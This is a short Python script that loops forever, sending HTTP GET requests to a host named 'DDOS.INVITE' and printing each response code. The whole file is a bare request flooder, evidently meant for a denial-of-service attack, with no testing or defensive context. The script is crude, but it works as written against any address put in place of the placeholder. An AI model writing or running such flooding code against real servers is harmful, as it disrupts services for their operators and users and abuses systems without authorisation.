import requests

while True:
    response = requests.get('http://DDOS.INVITE/')
    print(response.status_code)
